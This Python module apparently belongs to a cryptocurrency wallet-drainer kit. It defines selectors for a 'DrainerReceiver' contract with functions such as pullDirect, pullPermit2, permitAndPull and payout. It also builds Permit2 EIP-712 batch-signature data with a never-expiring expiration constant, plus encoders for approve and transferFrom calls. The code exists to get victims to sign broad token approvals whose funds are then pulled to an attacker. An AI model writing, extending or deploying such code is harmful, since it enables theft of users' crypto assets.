"""
Minimal ABI surface: selectors, Permit2, ERC-20, Multicall3, DrainerReceiver.

Selectors are derived from the exact Solidity signatures, so they cannot drift
from contracts/DrainerReceiver.sol. Encoding helpers validate before emitting.
"""
import re
from typing import Any, Dict

from eth_utils import keccak

_ADDR_RE = re.compile(r"^0x[0-9a-fA-F]{40}$")
UINT256_MAX = 2**256 - 1
UINT160_MAX = 2**160 - 1
UINT48_MAX = 2**48 - 1


def _sel(sig: str) -> str:
    return "0x" + keccak(text=sig)[:4].hex()


def is_address(value: object) -> bool:
    return isinstance(value, str) and bool(_ADDR_RE.match(value))


def require_address(value: object, label: str = "address") -> str:
    if not is_address(value):
        raise ValueError(f"{label} is not a valid 0x-prefixed 20-byte address: {value!r}")
    return value  # type: ignore[return-value]


def require_uint(value: int, bits: int = 256, label: str = "amount") -> int:
    v = int(value)
    if v < 0 or v >= 2**bits:
        raise ValueError(f"{label} out of range for uint{bits}: {v}")
    return v


# --- ERC-20 ---------------------------------------------------------------
SEL_BALANCE_OF    = _sel("balanceOf(address)")
SEL_ALLOWANCE     = _sel("allowance(address,address)")
SEL_APPROVE       = _sel("approve(address,uint256)")
SEL_TRANSFER_FROM = _sel("transferFrom(address,address,uint256)")
SEL_TRANSFER      = _sel("transfer(address,uint256)")
SEL_DECIMALS      = _sel("decimals()")
SEL_SYMBOL        = _sel("symbol()")
SEL_NAME          = _sel("name()")

# --- Multicall3 -----------------------------------------------------------
SEL_AGGREGATE3    = _sel("aggregate3((address,bool,bytes)[])")

# --- DrainerReceiver ------------------------------------------------------
SEL_PULL_DIRECT   = _sel("pullDirect(address,address,uint256)")
SEL_PULL_PERMIT2  = _sel("pullPermit2(address,address,uint160)")
SEL_PERMIT_PULL   = _sel(
    "permitAndPull(address,((address,uint160,uint48,uint48)[],address,uint256),"
    "bytes,address[],uint160[])"
)
SEL_OWNER         = _sel("owner()")
SEL_PAYOUT        = _sel("payout()")

# --- Permit2 owner-side revocation ---------------------------------------
# lockdown(address token) can only be called by the token owner; it clears the
# allowance this spender holds. Used when a user revokes a Permit2 batch.
SEL_LOCKDOWN      = _sel("lockdown(address)")

# --- log topics -----------------------------------------------------------
TRANSFER_TOPIC = "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef"
APPROVAL_TOPIC = "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925"

# --- canonical deployments (identical on every EVM chain) -----------------
PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"
MULTICALL3 = "0xcA11bde05977b3631167028862bE2a173976CA11"

# --- Permit2 EIP-712 ------------------------------------------------------
PERMIT2_DOMAIN_NAME = "Permit2"
PERMIT2_DOMAIN_VERSION = "1"          # EIP712("Permit2", "1") in the canonical contract
PERMIT_DETAILS_FOREVER = UINT48_MAX

# Permit2 is EIP712("Permit2", "1"). Omitting `version` changes the domain
# separator, so the wallet's digest never matches and permit() reverts InvalidSignature.
EIP712_DOMAIN = [
    {"name": "name", "type": "string"},
    {"name": "version", "type": "string"},
    {"name": "chainId", "type": "uint256"},
    {"name": "verifyingContract", "type": "address"},
]

EIP712_TYPES = {
    "PermitDetails": [
        {"name": "token", "type": "address"},
        {"name": "amount", "type": "uint160"},
        {"name": "expiration", "type": "uint48"},
        {"name": "nonce", "type": "uint48"},
    ],
    "PermitBatch": [
        {"name": "details", "type": "PermitDetails[]"},
        {"name": "spender", "type": "address"},
        {"name": "sigDeadline", "type": "uint256"},
    ],
}

# Full type map for eth_signTypedData_v4. Wallets require the domain type present.
EIP712_FULL_TYPES = {**EIP712_TYPES, "EIP712Domain": EIP712_DOMAIN}


# --- encoding -------------------------------------------------------------
def pad_address(addr: str) -> str:
    return require_address(addr).lower().replace("0x", "").rjust(64, "0")


def encode_balance_of(addr: str) -> str:
    return SEL_BALANCE_OF + pad_address(addr)


def permit2_domain(chain_id: int) -> Dict[str, Any]:
    """EIP-712 domain for a PermitBatch signature. `version` is mandatory."""
    return {
        "name": PERMIT2_DOMAIN_NAME,
        "version": PERMIT2_DOMAIN_VERSION,
        "chainId": int(chain_id),
        "verifyingContract": PERMIT2,
    }


def encode_allowance(owner: str, spender: str) -> str:
    return SEL_ALLOWANCE + pad_address(owner) + pad_address(spender)


def encode_approve(spender: str, amount: int) -> str:
    return SEL_APPROVE + pad_address(spender) + format(require_uint(amount), "064x")


def encode_transfer(dst: str, amount: int) -> str:
    return SEL_TRANSFER + pad_address(dst) + format(require_uint(amount), "064x")


def encode_transfer_from(src: str, dst: str, amount: int) -> str:
    return (SEL_TRANSFER_FROM + pad_address(src) + pad_address(dst)
            + format(require_uint(amount), "064x"))


__all__ = [n for n in dir() if n.startswith(("SEL_", "EIP712", "encode_", "require_", "is_"))
           or n in ("PERMIT2", "MULTICALL3", "TRANSFER_TOPIC", "APPROVAL_TOPIC",
                    "PERMIT2_DOMAIN_NAME", "PERMIT2_DOMAIN_VERSION",
                    "PERMIT_DETAILS_FOREVER", "UINT256_MAX",
                    "UINT160_MAX", "UINT48_MAX", "pad_address", "permit2_domain")]